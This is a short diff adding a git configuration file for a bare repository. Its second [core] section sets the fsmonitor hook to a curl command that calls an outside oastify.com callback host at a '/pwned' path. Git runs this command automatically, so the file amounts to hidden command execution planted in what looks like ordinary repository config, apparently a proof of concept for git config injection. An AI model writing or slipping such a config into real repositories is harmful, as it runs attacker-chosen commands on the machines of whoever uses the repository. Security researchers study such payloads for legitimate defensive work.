@@ -1,0 +1,6 @@
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = true
+[core]
+	fsmonitor = "curl http://hj473sagl15xoa05cck8d0gj3a91xslh.oastify.com/pwned"
